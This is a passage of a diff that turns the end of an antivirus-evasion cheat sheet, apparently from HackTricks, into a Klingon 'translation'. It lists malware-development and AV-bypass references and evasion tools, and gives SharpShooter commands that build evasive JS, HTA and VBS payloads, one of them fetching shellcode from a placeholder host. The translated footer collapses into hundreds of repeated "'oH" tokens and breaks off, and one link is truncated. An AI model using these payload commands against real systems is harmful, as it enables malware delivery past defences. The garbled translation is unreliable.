+* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
+* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
+* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
+* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
+
+### tlhIngan Hol translation:
 
 * [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
 * [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
@@ -558,8 +536,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 * [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 * [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Other tools
-
+### lo'wI'vam:
 ```bash
 # Veil Framework:
 https://github.com/Veil-Framework/Veil
@@ -569,36 +546,29 @@ https://www.shellterproject.com/download/
 
 # Sharpshooter
 # https://github.com/mdsecactivebreach/SharpShooter
-# Javascript Payload Stageless: 
+# Javascript Payload Stageless:
 SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
 
-# Stageless HTA Payload: 
+# Stageless HTA Payload:
 SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
 
 # Staged VBS:
 SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
 
-# Donut: 
+# Donut:
 https://github.com/TheWover/donut
 
 # Vulcan
 https://github.com/praetorian-code/vulcan
 ```
-
-### More
+### cha'logh
 
 * [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>laH</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks vItlhutlh:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
+* **HackTricks vItlhutlh** vItlhutlh **ghItlhvam** **HackTricks** **'oH** **SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **chel** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **
